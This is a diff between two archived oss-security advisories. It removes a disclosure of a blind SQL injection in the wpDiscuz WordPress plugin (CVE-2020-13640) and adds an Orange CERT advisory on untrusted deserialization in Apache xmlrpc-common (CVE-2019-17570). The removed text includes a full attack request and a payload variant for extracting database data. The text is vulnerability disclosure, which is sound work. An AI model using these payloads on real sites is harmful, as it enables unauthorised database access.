@@ -1,120 +1,76 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2020/07/06/1
-Message-ID: <b97e9440-e032-2a1b-3c75-5f7688927fa7@seclab.cs.msu.su>
-Date: Mon, 6 Jul 2020 02:13:39 +0300
-From: asterite <asterite@...lab.cs.msu.su>
-To: oss-security@...ts.openwall.com
-Subject: CVE-2020-13640: WordPress Plugin wpDiscuz <= 5.3.5 SQL injection
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2020/01/16/1
+Message-ID: <27352_1579165193_5E202609_27352_311_28_c5afd0f2-094a-4138-8175-775ad698ec78@OPEXCNORM4F.corporate.adroot.infra.ftgroup>
+Date: Thu, 16 Jan 2020 08:59:51 +0000
+From: <cert.cc@...nge.com>
+To: "oss-security@...ts.openwall.com" <oss-security@...ts.openwall.com>
+Subject: [CVE-2019-17570] xmlrpc-common untrusted deserialization
 Content-Type: text/plain; charset=utf-8
 
-There is an SQL injection in wpDiscuz plugin [1] version 5.3.5 and
-earlier. This vulnerability is not present in 7.X version line. Plugin
-vendor is gVectors [2]. The vulnerability can be exploited without
-authentication.
+Description
+===========
+Java untrusted deserialization in faultCause when processing an XMLRPC response. XMLRPC clients are thus targeted by this vulnerability, and rogue XMLRPC servers may gain arbitrary code execution on the XMLRPC client.
 
-## Vulnerability Description ##
+The vulnerability lays in the org.apache.xmlrpc.parser.XmlRpcResponseParser:addResult(Object) method.
 
-wpDiscuz is a plugin working with comments. It has an endpoint
-"wpdLoadMoreComments" for fetching comments for post with given id. This
-endpoint is vulnerable.
+This vulnerability is different from CVE-2016-5003, which uses ex:serializable type to perform deserialization. This new vulnerability only affects XMLRPC clients, which will receive response, possible faults. It is exploitable in default configuration.
 
-This is a boolean-based blind SQL-injection in parameter "order".
-Injected payload gets into "ORDER BY" clause. Injected query output and
-error message is not returned by the server, but attacker can use an
-error-based binary oracle telling whether query succeeded or not: if
-query fails with error, comment list in response will be empty,
-otherwise it will contain comments for post which id is given in a
-request. This means that, to exploit this vulnerability, an attacker
-needs a post with at least one comment (but this is easily achievable
-because usually sites have posts with comments and often commenting is
-enabled for non-logged-in users).
+Exploitation technique
+======================
+REMOTE, NONE AUTHENTICATION REQUIRED.
 
-### Example of request with an attack vector: ###
+REMINDER: This vulnerability is on client-side.
 
-POST /wp-admin/admin-ajax.php HTTP/1.1
-Host: localhost
-Content-Type: multipart/form-data;
-boundary=---------------------------14434359312532120894700338087
-Content-Length: 848
-Origin: http://localhost
-Connection: close
+CVSSv3 base score : 9.8
+=================
+CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
 
------------------------------14434359312532120894700338087
-Content-Disposition: form-data; name="action"
+Impact(s)
+=========
+An attacker may execute arbitrary code by using a gadget chain.
 
-wpdLoadMoreComments
------------------------------14434359312532120894700338087
-Content-Disposition: form-data; name="offset"
+Affected versions
+=================
+Detected on XMLRPC-common-Central-3.1.3 but applies to versions (non-exhaustive list):
+*         Redhat GA 3.1.3-redhat-5
+*         Redhat GA 3.1.3-redhat-2
+*         Redhat EA 3.1.3-redhat-1
+*         Central 3.1.3
+*         Central 3.1.2
+*         Central 3.1.1
+*         Central 3.1
 
-1
------------------------------14434359312532120894700338087
-Content-Disposition: form-data; name="orderBy"
+NOTE: Central 3.0.x are not vulnerable
 
-comment_date_gmt
------------------------------14434359312532120894700338087
-Content-Disposition: form-data; name="order"
+CVE Id
+==========
+CVE-2019-17570
 
-,  (select case when (ord(SUBSTRING((select SCHEMA_NAME from
-information_schema.schemata limit 1), 1, 1)) = 105) then 1 else
-1*(select table_name from information_schema.tables)end)=1  asc  #
------------------------------14434359312532120894700338087
-Content-Disposition: form-data; name="postId"
+Timeline
+========
+2019-11-19: Apache informed via email
+2019-11-19: Apache XML-RPC is no longer actively maintained
+2019-11-21: Red Hat informed via email
+2019-11-22: Vulnerability reaffected to Apache project
+2020-01-06: Distro OSS security informed via email
+2020-01-16: Vulnerability published to OSS security mailing list
 
-1234
------------------------------14434359312532120894700338087--
+Credits
+========
+Guillaume TEISSIER (Orange)
+Orange group
 
-here, injected query performs a test of character code of the first
-letter of the name of the first database in MySQL. Usually it's
-"information_schema", so the first letter is "i" (with code 105) and the
-query will succeed and comments for the post will be in returned response.
 
-An attacker could instead use vector
-",  (select case when (ord(SUBSTRING((select SCHEMA_NAME from
-information_schema.schemata limit 1), 1, 1)) = 106) then 1 else
-1*(select table_name from information_schema.tables)end)=1  asc  #"
-(double quotes for clarity) - in this query check would usually fail
-(char code is compared with incorrect value 106, so, erroneous else
-branch of 'case' will be executed) - so, comment list in response will
-be empty.
+_________________________________________________________________________________________________________________________
 
-(legitimate values of "order" parameter are "asc" and "desc")
+Ce message et ses pieces jointes peuvent contenir des informations confidentielles ou privilegiees et ne doivent donc
+pas etre diffuses, exploites ou copies sans autorisation. Si vous avez recu ce message par erreur, veuillez le signaler
+a l'expediteur et le detruire ainsi que les pieces jointes. Les messages electroniques etant susceptibles d'alteration,
+Orange decline toute responsabilite si ce message a ete altere, deforme ou falsifie. Merci.
 
-## Exploit ##
-
-PoC exploit can be found here:
-https://github.com/asterite3/CVE-2020-13640/blob/master/exploit.py
-
-## Cause ##
-
-Regarding the cause of vulnerability: if I understood everything
-correctly, the reason is that function "loadMoreComments()" in
-class.WpdiscuzCore.php takes "_POST['order']" unsanitized and puts it to
-"$args['order']", which, after several re-assignments into different
-vars/properties, gets appended to "orderby" parameter in
-"comments_clauses" hook [3] (in method "commentsClauses()" of
-"WpdiscuzCore" class). If I got it right then values affected by
-"comments_clauses" hook are put into SQL query (that fetches comments)
-without further sanitization - so, it's dangerous to let unsanitized
-user input get into them.
-
-## Timeline (dd/mm/yyyy) ##
-
-27/05/2020: Reported to vendor
-27/05/2020: CVE assigned
-29/05/2020: Reported to WordPress plugin team
-29/05/2020: Got response from vendor
-12/06/2020: Vendor publishes information about the vulnerability on
-plugin site [4] and WP plugin page [5]
-12/06/2020: Patched version in 5.X line (5.3.6) is released [6]
-
-## References ##
-
-[1] https://wordpress.org/plugins/wpdiscuz/
-[2] https://gvectors.com/
-[3] https://developer.wordpress.org/reference/hooks/comments_clauses/
-[4]
-https://wpdiscuz.com/community/news/security-vulnerability-issue-in-5-3-5-please-udate/
-[5] https://wordpress.org/plugins/wpdiscuz/#developers
-[6] https://plugins.trac.wordpress.org/log/wpdiscuz/tags/5.3.6?rev=2335769
-
+This message and its attachments may contain confidential or privileged information that may be protected by law;
+they should not be distributed, used or copied without authorisation.
+If you have received this email in error, please notify the sender and delete this message and its attachments.
+As emails may be altered, Orange is not liable for messages that have been modified, changed or falsified.
+Thank you.
 
